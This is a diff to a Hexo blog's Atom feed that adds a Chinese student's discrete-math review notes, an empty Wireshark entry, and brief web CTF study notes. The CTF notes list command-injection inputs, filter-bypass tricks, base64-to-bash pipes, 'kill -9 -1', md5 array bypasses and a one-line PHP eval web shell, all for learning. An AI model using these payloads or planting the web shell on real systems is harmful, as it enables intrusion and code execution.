@@ -6,7 +6,7 @@
   <link href="https://github.com/xyy9233/xyy9233.github.io.git/atom.xml" rel="self"/>
   
   <link href="https://github.com/xyy9233/xyy9233.github.io.git/"/>
-  <updated>2023-01-04T06:04:43.486Z</updated>
+  <updated>2023-02-02T17:51:44.444Z</updated>
   <id>https://github.com/xyy9233/xyy9233.github.io.git/</id>
   
   <author>
@@ -15,6 +15,67 @@
   </author>
   
   <generator uri="https://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title></title>
+    <link href="https://github.com/xyy9233/xyy9233.github.io.git/2023/02/01/%E7%A6%BB%E6%95%A3%E6%95%B0%E5%AD%A6%E5%A4%8D%E4%B9%A0/"/>
+    <id>https://github.com/xyy9233/xyy9233.github.io.git/2023/02/01/%E7%A6%BB%E6%95%A3%E6%95%B0%E5%AD%A6%E5%A4%8D%E4%B9%A0/</id>
+    <published>2023-01-31T16:18:51.197Z</published>
+    <updated>2023-02-02T17:51:44.444Z</updated>
+    
+    <content type="html"><![CDATA[<h1 id="离散数学复习"><a href="#离散数学复习" class="headerlink" title="离散数学复习"></a>离散数学复习</h1><p>[TOC]</p><h2 id="数理逻辑"><a href="#数理逻辑" class="headerlink" title="数理逻辑"></a>数理逻辑</h2><h3 id="命题逻辑"><a href="#命题逻辑" class="headerlink" title="命题逻辑"></a>命题逻辑</h3><h4 id="命题"><a href="#命题" class="headerlink" title="命题"></a>命题</h4><p>（1）原子命题（不包含任何联结词）；（2）复合命题；</p><h4 id="命题标识符"><a href="#命题标识符" class="headerlink" title="命题标识符"></a>命题标识符</h4><p>（A，Ai，[12]）（1）确定—&gt;命题常量；（2）不确定—&gt;命题变元（不是命题）（标题原子命题，可称为原子变元）；</p><h4 id="联结词"><a href="#联结词" class="headerlink" title="联结词"></a>联结词</h4><table><thead><tr><th>联结词</th><th></th><th></th><th></th></tr></thead><tbody><tr><td>合取（可兼或）</td><td>∧</td><td>析取</td><td>∨</td></tr><tr><td>否定</td><td>¬</td><td>（一元运算）</td><td></td></tr><tr><td>条件（前件&#x2F;前提，后件）</td><td>⇒</td><td>双条件</td><td>↔&#x2F;iff</td></tr><tr><td>不可间或&#x2F;异或</td><td><strong>⊽</strong></td><td></td><td></td></tr><tr><td>条件否定</td><td><img src="C:\Users\17687\Desktop\HexoBlog\assets\7ce0a65c91daf4b5972fa52d074653e.png" alt="7ce0a65c91daf4b5972fa52d074653e"></td><td></td><td></td></tr><tr><td>与非</td><td><img src="C:\Users\17687\Desktop\HexoBlog\assets\98c600051d233f4993d2eb270045a71.png" alt="98c600051d233f4993d2eb270045a71"></td><td>或非</td><td><img src="C:\Users\17687\Desktop\HexoBlog\assets\56f7c78d0b8aa08fd6acb475e23859d.png" alt="56f7c78d0b8aa08fd6acb475e23859d"></td></tr></tbody></table><p>优先顺序：否定，合取，析取，条件，双条件；</p><p>表1-4.8</p><table><thead><tr><th align="center">命题定律</th><th>表达式</th><th>序号</th></tr></thead><tbody><tr><td align="center">对合律</td><td>¬¬P⇔P</td><td>1</td></tr><tr><td align="center">幂等律</td><td>P∨P⇔P,P∧P⇔P</td><td>2</td></tr><tr><td align="center">结合律</td><td>(P∨Q)∨R⇔P∨(Q∨R)</td><td>3</td></tr><tr><td align="center">交换律</td><td>P∨Q⇔Q∨P</td><td>4</td></tr><tr><td align="center">分配律</td><td>P∨(Q∧R)⇔(P∨Q)∧(P∨R)</td><td>5</td></tr><tr><td align="center">吸收律</td><td>(P∨Q)∧P⇔P;(P∧Q)∨P⇔P</td><td>6</td></tr><tr><td align="center">德摩根律</td><td>¬(P∨Q)⇔¬P∧¬Q</td><td>7</td></tr><tr><td align="center">同一律</td><td>P∨F⇔P</td><td>8</td></tr><tr><td align="center">零律</td><td>P∨T⇔T</td><td>9</td></tr><tr><td align="center">否定律</td><td>P∨¬P⇔T;P∧¬P⇔F</td><td>10</td></tr></tbody></table><h4 id="命题公式："><a href="#命题公式：" class="headerlink" title="命题公式："></a>命题公式：</h4><h5 id="重言式-x2F-永真式；矛盾式-x2F-永假式；可满足式；"><a href="#重言式-x2F-永真式；矛盾式-x2F-永假式；可满足式；" class="headerlink" title="重言式&#x2F;永真式；矛盾式&#x2F;永假式；可满足式；"></a>重言式&#x2F;永真式；矛盾式&#x2F;永假式；可满足式；</h5><p>判断方法：（1）真值表；（2）等值演算法；</p><h5 id="蕴含式（⇒）："><a href="#蕴含式（⇒）：" class="headerlink" title="蕴含式（⇒）："></a>蕴含式（⇒）：</h5><p>要证P⇒Q，即证P—&gt;Q是重言式，或证其逆反式是重言式即可。</p><p><img src="C:\Users\17687\Desktop\HexoBlog\assets\2fe8326492bf454414a0039df658692.png" alt="2fe8326492bf454414a0039df658692"></p><p><img src="C:\Users\17687\Desktop\HexoBlog\assets\8922aaf5d2d66c0595421ed13ed0b71.png" alt="8922aaf5d2d66c0595421ed13ed0b71"></p><h5 id="对偶式："><a href="#对偶式：" class="headerlink" title="对偶式："></a>对偶式：</h5><p>反过来</p><h5 id="泛式：（合取范式，析取范式，主范式（小项-x2F-布尔合取）（主析取范式）（大项）（主合取范式））"><a href="#泛式：（合取范式，析取范式，主范式（小项-x2F-布尔合取）（主析取范式）（大项）（主合取范式））" class="headerlink" title="泛式：（合取范式，析取范式，主范式（小项&#x2F;布尔合取）（主析取范式）（大项）（主合取范式））"></a>泛式：（合取范式，析取范式，主范式（小项&#x2F;布尔合取）（主析取范式）（大项）（主合取范式））</h5><p><img src="C:\Users\17687\Desktop\HexoBlog\assets\c97026723b705cf3df18948f76f55b6.png" alt="c97026723b705cf3df18948f76f55b6"></p><h3 id="谓词逻辑"><a href="#谓词逻辑" class="headerlink" title="谓词逻辑"></a>谓词逻辑</h3><h5 id="客体-x2F-个体："><a href="#客体-x2F-个体：" class="headerlink" title="客体&#x2F;个体："></a>客体&#x2F;个体：</h5><p>可以独立存在的具体事务或抽象概念</p><h5 id="客体常元："><a href="#客体常元：" class="headerlink" title="客体常元："></a>客体常元：</h5><p>表示具体或特定的客体abc</p><h5 id="客体变元："><a href="#客体变元：" class="headerlink" title="客体变元："></a>客体变元：</h5><p>表示抽象或泛指的客体xyz</p><h5 id="谓词"><a href="#谓词" class="headerlink" title="谓词"></a>谓词</h5><h5 id="谓词表达式"><a href="#谓词表达式" class="headerlink" title="谓词表达式"></a>谓词表达式</h5><h5 id="个体域（在命题函数中，命题变元的论述范围）"><a href="#个体域（在命题函数中，命题变元的论述范围）" class="headerlink" title="个体域（在命题函数中，命题变元的论述范围）"></a>个体域（在命题函数中，命题变元的论述范围）</h5><h5 id="全总个体域（个体域综合在一起，作为论述范围的域，称为全总个体域）"><a href="#全总个体域（个体域综合在一起，作为论述范围的域，称为全总个体域）" class="headerlink" title="全总个体域（个体域综合在一起，作为论述范围的域，称为全总个体域）"></a>全总个体域（个体域综合在一起，作为论述范围的域，称为全总个体域）</h5><p>量词（全称，特称</p><h5 id="特性谓词（"><a href="#特性谓词（" class="headerlink" title="特性谓词（"></a>特性谓词（</h5><p><img src="C:\Users\17687\Desktop\HexoBlog\assets\c2dc3629cc0f89ddd7302a37f2a8bc8.png" alt="c2dc3629cc0f89ddd7302a37f2a8bc8"></p><p><img src="C:\Users\17687\Desktop\HexoBlog\assets\592239fae5a4c57173645914d8bc0b3.png" alt="592239fae5a4c57173645914d8bc0b3"></p><p><img src="C:\Users\17687\Desktop\HexoBlog\assets\e171874b6686da023ecf9ef5e1660e3.png"></p><p><img src="C:\Users\17687\Desktop\HexoBlog\assets\806551d7585fd837e57951bf281ae63.png" alt="32925e2a606376dfc8de0ed354d9a66"></p><p><img src="C:\Users\17687\Desktop\HexoBlog\assets\750320eb62ff65c2f7702ad9b83282e.png" alt="750320eb62ff65c2f7702ad9b83282e"></p><h5 id="谓词公式："><a href="#谓词公式：" class="headerlink" title="谓词公式："></a>谓词公式：</h5><p><img src="C:\Users\17687\Desktop\HexoBlog\assets\0a2068ea8480b5677cf9d7975914cf9.png" alt="0a2068ea8480b5677cf9d7975914cf9"></p><p><img src="C:\Users\17687\Desktop\HexoBlog\assets\1d9d396230d9df121826d59bbfdc92d.png" alt="1d9d396230d9df121826d59bbfdc92d"></p><h5 id="变元约束（指导变元-x2F-作用变元，作用域-x2F-量词辖域，约束变元，自由变元，代入规则"><a href="#变元约束（指导变元-x2F-作用变元，作用域-x2F-量词辖域，约束变元，自由变元，代入规则" class="headerlink" title="变元约束（指导变元&#x2F;作用变元，作用域&#x2F;量词辖域，约束变元，自由变元，代入规则"></a>变元约束（指导变元&#x2F;作用变元，作用域&#x2F;量词辖域，约束变元，自由变元，代入规则</h5><p><img src="C:\Users\17687\Desktop\HexoBlog\assets\30142e27c294883fded59937def532b.png" alt="30142e27c294883fded59937def532b"></p><p><img src="C:\Users\17687\Desktop\HexoBlog\assets\68bbc8aca956eeb51e7f76252ca0b5b.png" alt="68bbc8aca956eeb51e7f76252ca0b5b"></p><p><img src="C:\Users\17687\Desktop\HexoBlog\assets\450ed9d6621d37248c10229e686bf0c.png" alt="450ed9d6621d37248c10229e686bf0c"></p><p>约束换辖域，自由全代换</p><p><img src="C:\Users\17687\Desktop\HexoBlog\assets\90ca12404cd07f16df76ff55189c3b8.png" alt="90ca12404cd07f16df76ff55189c3b8"></p><h4 id="谓词演算等价式与蕴含式"><a href="#谓词演算等价式与蕴含式" class="headerlink" title="谓词演算等价式与蕴含式"></a>谓词演算等价式与蕴含式</h4><p><img src="C:\Users\17687\Desktop\HexoBlog\assets\5f806084057fafefcc925c60ac78e07.png" alt="5f806084057fafefcc925c60ac78e07"></p><p><img src="C:\Users\17687\Desktop\HexoBlog\assets\699b9d7ea086c1483d2258a7eebb660.png" alt="699b9d7ea086c1483d2258a7eebb660"></p><h5 id="量词辖域的扩张和收缩"><a href="#量词辖域的扩张和收缩" class="headerlink" title="量词辖域的扩张和收缩"></a>量词辖域的扩张和收缩</h5><p><img src="C:\Users\17687\Desktop\HexoBlog\assets\395095185fc510b17596a19376490bf.png" alt="395095185fc510b17596a19376490bf"></p><p><img src="C:\Users\17687\Desktop\HexoBlog\assets\6bfae34ce0208d402bdb6aec4427263.png" alt="6bfae34ce0208d402bdb6aec4427263"></p><h5 id="量词与命题联结词之间的一些等价式"><a href="#量词与命题联结词之间的一些等价式" class="headerlink" title="量词与命题联结词之间的一些等价式"></a>量词与命题联结词之间的一些等价式</h5><p><img src="C:\Users\17687\Desktop\HexoBlog\assets\e2702f15fd2b33dac1d06a7b853ded2.png" alt="e2702f15fd2b33dac1d06a7b853ded2"></p><p><img src="C:\Users\17687\Desktop\HexoBlog\assets\59f16e11bd5fa6018ef5f5aa52cedcc.png" alt="59f16e11bd5fa6018ef5f5aa52cedcc"></p><p><img src="C:\Users\17687\Desktop\HexoBlog\assets\3ab478d2dd741894f563e2ed124ca04.png" alt="3ab478d2dd741894f563e2ed124ca04"></p><p><img src="C:\Users\17687\Desktop\HexoBlog\assets\4b22050289f8812381e570b295ef9dd.png" alt="4b22050289f8812381e570b295ef9dd"></p><h4 id="前束范式"><a href="#前束范式" class="headerlink" title="前束范式"></a>前束范式</h4><p><img src="C:\Users\17687\Desktop\HexoBlog\assets\86d083ce01e15fa6429965c58468f70.png" alt="86d083ce01e15fa6429965c58468f70"></p><h5 id="前束合取范式"><a href="#前束合取范式" class="headerlink" title="前束合取范式"></a>前束合取范式</h5><p><img src="C:\Users\17687\Desktop\HexoBlog\assets\ec41bd94fcfb65543ad767ee6d358ac.png" alt="ec41bd94fcfb65543ad767ee6d358ac"></p><p><img src="C:\Users\17687\Desktop\HexoBlog\assets\e1846e5ce0209b49dff00823f845a23.png" alt="e1846e5ce0209b49dff00823f845a23"></p><h5 id="前束析取范式"><a href="#前束析取范式" class="headerlink" title="前束析取范式"></a>前束析取范式</h5><h4 id="谓词演算的推理理论"><a href="#谓词演算的推理理论" class="headerlink" title="谓词演算的推理理论"></a>谓词演算的推理理论</h4><p>在谓词逻辑中，如果A1∧A2∧…∧An→B是逻辑有效式，则称B是A1,  A2, …，An的有效结论，记作A1∧A2∧…∧AnBAB 当且仅当 AB是重言式</p><p><img src="C:\Users\17687\Desktop\HexoBlog\assets\5efa3a2a8bf14f6f69514c6f2599d7a.png" alt="5efa3a2a8bf14f6f69514c6f2599d7a"></p><p><img src="C:\Users\17687\Desktop\HexoBlog\assets\ac71caf027a916bb14a7572fc7f83d3.png" alt="ac71caf027a916bb14a7572fc7f83d3"></p><p><img src="C:\Users\17687\Desktop\HexoBlog\assets\4d0c8929c739e3097cf8d511c50184b.png" alt="4d0c8929c739e3097cf8d511c50184b"></p><p><img src="C:\Users\17687\Desktop\HexoBlog\assets\26f56ee34b46bca6c4a2e25724bfcb6.png" alt="26f56ee34b46bca6c4a2e25724bfcb6"></p><p><img src="C:\Users\17687\Desktop\HexoBlog\assets\c2fedbb490e59083c226dd8d25fd44f.png" alt="c2fedbb490e59083c226dd8d25fd44f"></p><h2 id="集合论"><a href="#集合论" class="headerlink" title="集合论"></a>集合论</h2><h3 id="集合与关系"><a href="#集合与关系" class="headerlink" title="集合与关系"></a>集合与关系</h3><h3 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h3><h2 id="代数系统"><a href="#代数系统" class="headerlink" title="代数系统"></a>代数系统</h2><h3 id="代数结构"><a href="#代数结构" class="headerlink" title="代数结构"></a>代数结构</h3><h3 id="格与布尔代数"><a href="#格与布尔代数" class="headerlink" title="格与布尔代数"></a>格与布尔代数</h3><h2 id="图论"><a href="#图论" class="headerlink" title="图论"></a>图论</h2>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;h1 id=&quot;离散数学复习&quot;&gt;&lt;a href=&quot;#离散数学复习&quot; class=&quot;headerlink&quot; title=&quot;离散数学复习&quot;&gt;&lt;/a&gt;离散数学复习&lt;/h1&gt;&lt;p&gt;[TOC]&lt;/p&gt;
+&lt;h2 id=&quot;数理逻辑&quot;&gt;&lt;a href=&quot;#数理逻辑&quot; class=&quot;headerl</summary>
+      
+    
+    
+    
+    
+  </entry>
+  
+  <entry>
+    <title></title>
+    <link href="https://github.com/xyy9233/xyy9233.github.io.git/2023/01/05/webctf%E9%A2%98%E7%9B%AE/"/>
+    <id>https://github.com/xyy9233/xyy9233.github.io.git/2023/01/05/webctf%E9%A2%98%E7%9B%AE/</id>
+    <published>2023-01-05T15:41:50.864Z</published>
+    <updated>2023-01-06T08:23:37.615Z</updated>
+    
+    <content type="html"><![CDATA[<h1 id="webctf题目"><a href="#webctf题目" class="headerlink" title="webctf题目"></a>webctf题目</h1><h3 id="弱类型"><a href="#弱类型" class="headerlink" title="弱类型"></a>弱类型</h3><h4 id="判断："><a href="#判断：" class="headerlink" title="判断："></a>判断：</h4><p>严格判断：</p><p>&#x3D;&#x3D;&#x3D;类型+比较</p><p>&#x3D;&#x3D;：字符串转换再比较</p><h3 id="哈希绕过"><a href="#哈希绕过" class="headerlink" title="哈希绕过"></a>哈希绕过</h3><p>md5(弱类型)</p><p>md(array(0&#x3D;&gt;’xx’))&#x3D;&#x3D;null</p><p>?a[]&#x3D;lkajlfkald;</p><p>?a[]&#x3D;a1&amp;a[y]&#x3D;a2&amp;a[z]&#x3D;a3;</p><blockquote><p>eg:taco:url传入一个$a是数组，检查$a[0]和$1a严格过滤</p><p>去$a数组前两个元素拼接：</p><p>？a[3]&#x3D;ksjdf&amp;a[4]&#x3D;kdjfh&amp;a[0]&#x3D;khdas</p></blockquote><p> 变量覆盖</p><h4 id="命令执行漏洞："><a href="#命令执行漏洞：" class="headerlink" title="命令执行漏洞："></a>命令执行漏洞：</h4><p>system exec shell_exec</p><p>cp&#x2F;tmp&#x2F;sourcefile&#x2F;app&#x2F;public&#x2F;#{userinput}..jpg</p><p>mkdir abc;cat&#x2F;flag</p><h4 id="命令注入："><a href="#命令注入：" class="headerlink" title="命令注入："></a>命令注入：</h4><p>www-data</p><p>www-doctor</p><p>awd(写权限改bug)</p><p>ps -ef|grep shell.php</p><p>kill -9 pid</p><p>www-data</p><p>kill -9 -1</p><h5 id="漏洞位点："><a href="#漏洞位点：" class="headerlink" title="漏洞位点："></a>漏洞位点：</h5><p>程序过滤不严谨，导致用户可以将代码注入并执行</p><p>eval(),assert(),preg_replace(),call_user_func()</p><p>…</p><p>对于执行命令的</p><p>echo ‘ls’(shell_exec()别名)</p><p>system(),exec(),shell_exec(),passthru(),pctnl_exec(),popen(),proc_open()</p><p> 127.0.0.1;ls -l </p><p>联合执行</p><p>actf2020exec</p><p>cat&#x2F;flag</p><p>无回显：带出，延时盲注</p><p>空格：${IFS}</p><p>关键字过滤：cat：fla\g.php</p><p>fla’’g</p><p>‘fla’’g’</p><p>python:’a’’b’’c’</p><p>“ajsdh”|base64 -d|bash</p><p>“asdasdasd”|xxd -r -p|bash</p><p>y1[n]g.php</p><p>y1n*</p><p>y1n?</p><p>y1{a..z}g </p><p>cat $(ls |grep fla)</p><p>内联执行：a&#x3D;fl;b&#x3D;ag;cat $a$b.php</p><p>eg：GCYCTF2019 PingPingPing</p><h5 id="代码执行漏洞"><a href="#代码执行漏洞" class="headerlink" title="代码执行漏洞"></a>代码执行漏洞</h5><?php eval($_POST[0]);?><p>   eval()函数</p>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;h1 id=&quot;webctf题目&quot;&gt;&lt;a href=&quot;#webctf题目&quot; class=&quot;headerlink&quot; title=&quot;webctf题目&quot;&gt;&lt;/a&gt;webctf题目&lt;/h1&gt;&lt;h3 id=&quot;弱类型&quot;&gt;&lt;a href=&quot;#弱类型&quot; class=&quot;headerlink&quot; ti</summary>
+      
+    
+    
+    
+    
+  </entry>
+  
+  <entry>
+    <title></title>
+    <link href="https://github.com/xyy9233/xyy9233.github.io.git/2023/01/04/Wireshark%E5%AD%A6%E4%B9%A0/"/>
+    <id>https://github.com/xyy9233/xyy9233.github.io.git/2023/01/04/Wireshark%E5%AD%A6%E4%B9%A0/</id>
+    <published>2023-01-04T09:53:33.799Z</published>
+    <updated>2023-01-04T09:53:34.280Z</updated>
+    
+    <content type="html"><![CDATA[<h1 id="Wireshark学习"><a href="#Wireshark学习" class="headerlink" title="Wireshark学习"></a>Wireshark学习</h1>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;h1 id=&quot;Wireshark学习&quot;&gt;&lt;a href=&quot;#Wireshark学习&quot; class=&quot;headerlink&quot; title=&quot;Wireshark学习&quot;&gt;&lt;/a&gt;Wireshark学习&lt;/h1&gt;</summary>
+      
+    
+    
+    
+    
+  </entry>
   
   <entry>
     <title>WEB学习基础</title>
